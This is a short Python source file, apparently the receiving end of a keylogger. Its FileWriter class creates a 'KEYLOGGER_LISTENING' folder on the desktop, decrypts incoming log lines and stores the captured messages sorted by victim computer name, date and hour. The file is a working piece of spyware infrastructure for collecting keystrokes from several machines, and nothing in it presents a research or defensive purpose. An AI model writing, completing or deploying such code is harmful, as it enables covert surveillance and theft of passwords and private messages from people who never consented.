import os
from datetime import datetime
from encryptor import Encryptor
from pathlib import Path

class FileWriter:
    def __init__(self, base_dir_name="KEYLOGGER_LISTENING"):
        desktop = Path.home() / "Desktop"
        self.base_dir = desktop / base_dir_name
        os.makedirs(self.base_dir, exist_ok=True)

    def write(self, encrypted_log_line: str):
        try:
            log_line = Encryptor.decrypt(encrypted_log_line)
            timestamp_str, computer_name, message = log_line.split(" | ", 2)
            timestamp = datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")

            computer_dir = os.path.join(self.base_dir, computer_name)
            date_dir = os.path.join(computer_dir, timestamp.strftime("%Y-%m-%d"))
            os.makedirs(date_dir, exist_ok=True)

            filename = f"{timestamp.strftime('%H')}.txt"
            file_path = os.path.join(date_dir, filename)

            with open(file_path, "a", encoding="utf-8") as f:
                f.write(message + "\n")
        except Exception as e:
            print(f"⚠️ שגיאה בכתיבה: {e}")
